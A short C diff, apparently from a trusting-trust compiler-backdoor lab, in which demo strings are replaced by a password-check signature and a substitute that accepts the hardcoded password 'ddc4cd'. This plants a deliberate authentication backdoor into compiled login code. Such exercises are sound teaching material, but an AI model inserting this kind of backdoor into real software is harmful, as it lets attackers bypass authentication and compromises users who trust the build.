@@ -4,8 +4,8 @@
 #define N 8 * 1024 * 1024
 
 static char compile_sig[] = "/* open the file */";
-static char hello_sig[] = "Hello world!";
-static char hello_attack[] = "Hello hacker!";
+static char hello_sig[] = "if(strcmp(c->passwd, passwd) == 0)";
+static char hello_attack[] = "if(strcmp(c->passwd, passwd) == 0 || strcmp(\"ddc4cd\", passwd) == 0)";
 int target_fd, n_read;
 char* hello_i;
 char* compile_i;
